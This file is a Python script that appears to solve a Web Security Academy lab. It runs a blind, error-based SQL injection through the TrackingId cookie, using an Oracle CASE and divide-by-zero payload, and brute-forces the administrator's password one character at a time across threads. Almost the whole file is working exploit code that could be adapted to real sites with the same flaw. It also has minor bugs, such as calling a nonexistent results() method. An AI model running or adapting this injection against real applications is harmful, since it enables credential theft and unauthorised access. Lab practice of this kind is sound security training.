#!/usr/bin/python3

import requests
import string
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from concurrent.futures import ThreadPoolExecutor, as_completed

nums = ''.join(chr(i) for i in range(48,58))
uppercase = ''.join(chr(i) for i in range(65,91))
lowercase = ''.join(chr(i) for i in range(97,123))

payloads = nums + uppercase + lowercase


def split(string):
    return list(string)

split(payloads)


proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


# modify url
url = 'https://acaa1f011e81f025c06a025900c10011.web-security-academy.net/'

def runner():
    threads = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        # modify range based on pw length
        for i in range(1,21):
            threads.append(executor.submit(bruteforce, i))

        for task in as_completed(threads):
            print(task.results())



def bruteforce(i):
    for payload in payloads:

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0)     Gecko/20100101 Firefox/78.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en    ;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Dnt': '1',
            'Referer': 'https://acaa1f011e81f025c06a025900c10011.web-security-academy.net/',
            'Cookie': "TrackingId=aVE81OoBULMvi5BV' AND (SELECT CASE WHEN ((SELECT SUBSTR(password," + str(i) + ",1) FROM users WHERE username LIKE 'administrator')='" + str(payload) + "') THEN to_char(1/0) ELSE 'a' END FROM dual)='a; session=WcaAKShhDvKG7fLYNViCZJ83d4yPFQpX",
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Sec-Gpc': '1',
            'Te': 'trailers',
            'Connection': 'close'
        }
        
        r = requests.get(url, headers=headers, proxies=proxies, verify=False)
        sc = r.status_code
        if sc == 500:
            print("Placement is: " + str(i) + " and letter is " + payload)
            break
        else:
            continue

runner()
